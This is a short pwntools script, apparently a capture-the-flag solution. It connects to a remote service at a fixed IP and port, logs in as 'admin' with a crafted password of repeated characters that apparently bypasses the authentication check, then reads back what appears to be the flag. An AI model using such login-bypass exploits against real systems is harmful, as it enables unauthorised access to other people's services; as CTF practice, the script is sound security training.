from pwn import *

r = remote("172.188.90.64", 21001, level="debug")

response = r.recvuntil(b">> ")
r.sendline(b"1")

response = r.recvuntil(b"Username: ")
r.sendline(b"admin")

response = r.recvuntil(b"Password: ")
str = b"z" * 18
str += b"_"
r.sendline(str)

response = r.recvuntil(b"Login successful!")

response = r.recvuntil(b">> ")
r.sendline(b"1")

response = r.recvuntil(b"}")

r.close()